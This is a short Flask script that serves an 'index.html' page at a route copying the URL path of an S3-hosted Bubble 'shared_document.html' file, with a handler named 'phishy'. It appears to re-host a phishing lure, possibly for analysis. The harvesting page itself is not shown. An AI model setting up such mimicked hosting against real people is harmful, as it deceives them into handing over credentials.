from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='s3.amazonaws.com/appforest_uf/f1666598162043x196680428921248030')

@app.route('/appforest_uf/f1666598162043x196680428921248030/shared_document.html')
def phishy():
    return render_template('index.html')

if __name__ == '__main__':
    app.run('0.0.0.0')